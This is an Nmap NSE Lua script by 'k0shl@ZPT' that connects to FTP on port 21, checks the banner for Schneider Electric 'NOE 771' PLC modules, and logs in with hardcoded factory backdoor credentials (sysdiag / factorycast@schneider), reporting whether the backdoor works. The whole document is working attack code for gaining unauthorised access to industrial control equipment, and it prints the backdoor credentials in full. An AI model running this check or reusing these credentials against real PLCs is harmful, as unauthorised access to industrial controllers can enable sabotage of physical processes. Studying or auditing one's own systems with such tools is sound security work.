-- The Head Section --

local ftp = require "ftp"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Schneider Electric PLC Backdoor nse script
]]

author = "k0shl@ZPT"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"Schneider", "Backdoor"}

-- The Rule Section --

local CMD_FTP_USER = "USER sysdiag\r\n"
local CMD_FTP_PASS = "PASS factorycast@schneider\r\n"

portrule = shortport.port_or_service(21, "ftp")

-- The Action Section --

action = function( host, port )

--Connect Schneider PLC

local sock,err = ftp.connect(host,port)
if not sock then
    return nil
end

--Schneider Banner
local s = "NOE 771"
local buffer = stdnse.make_buffer(sock, "\r?\n")
local code,message = ftp.read_reply(buffer)
print(message)
local q = string.find(message,s)
print(q)
if q ~= nil then
    print("[+]Find Schneider Info")
    print("[+]Starting test backdoor...")
else 
    return nil
end
if not code then
    return nil
end

--Send USER
local status,ret = sock:send(CMD_FTP_USER .. "\r\n")
if not status then
    return nil
end

local result_buffer = stdnse.make_buffer(sock,"\r?\n")
local code,result_message = ftp.read_reply(buffer)
print("[+]" .. result_message)

--Send PASS
local status,ret = sock:send(CMD_FTP_PASS .. "\r\n")
if not status then
    return nil
end

local result_buffer = stdnse.make_buffer(sock,"\r?\n")
local code,result_message = ftp.read_reply(buffer)
print("[+]" .. result_message)

--Back Result
q = string.find(result_message,"logged in")
if q~= nil then
    return "[!]Find Schneider Backdoor!"
else
    return "[-]No Vul!"
end
end
